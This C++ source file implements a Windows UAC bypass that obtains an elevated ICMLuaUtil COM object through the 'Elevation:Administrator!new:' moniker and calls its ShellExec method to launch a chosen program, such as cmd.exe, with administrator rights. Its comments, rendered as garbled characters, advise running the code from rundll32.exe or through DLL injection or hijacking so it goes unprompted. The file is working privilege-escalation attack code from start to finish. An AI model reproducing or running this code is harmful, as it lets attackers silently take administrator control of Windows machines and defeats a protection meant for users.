#include "stdafx.h"
#include "BypassUAC.h"

/*
	com�������Ƽ��������������û��˻������µ�Ӧ�ó�������Ȩ�ķ���������com�࣬������com�ӿ�Ȩ��
���У�ICMLuaUtil �ӿ��ṩ��ShellExec ������ִ���������ָ�����̡�

���ڽ��ܻ��� ICMLuaUtil �ӿڵ�Bypass UAC ��ʵ��ԭ��
����COM������������ ICMLuaUtil �ӿ���Ȩ����Ȩ��ͨ������ShellExec ����������ָ�����̣�ʵ��BypassUac

*/

//����COM�࣬��ʼ��COM����
HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// ��ʼ��COM����
	::CoInitialize(NULL);

	// �����ַ���
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// ����BIND_OPTS3
	::RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// �������ƶ��󲢻�ȡCOM����
	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}

/*
ע�⣺���ִ��COM�������ƴ���ĳ�����ݲ����ţ���ᴥ��UAC����
����Ӧ��ѡ����ų���������������±���rundll32.exe
���Կ���ͨ��dll ע����ǽٳֵȼ���������δ���ע�뵽���ų���Ľ��̿ռ��С�
������򵥵���ͨ�� rundll32.exe ������dll,ִ��com�������ƵĴ��롣

���� rundll32.exe �����Զ���dll�еĵ������������������Ĳ����ͷ���ֵ��������涨�ģ�����������ʽ��

// ����������rundll32.exe����ִ��
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	//����룬�� CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
}
*/


//����ʹ��com�����ShellExec������Ȩ
BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil *CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		// ��Ȩ
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		// ��������
		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	}while(FALSE);

	// �ͷ�
	if (CMLuaUtil) 
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}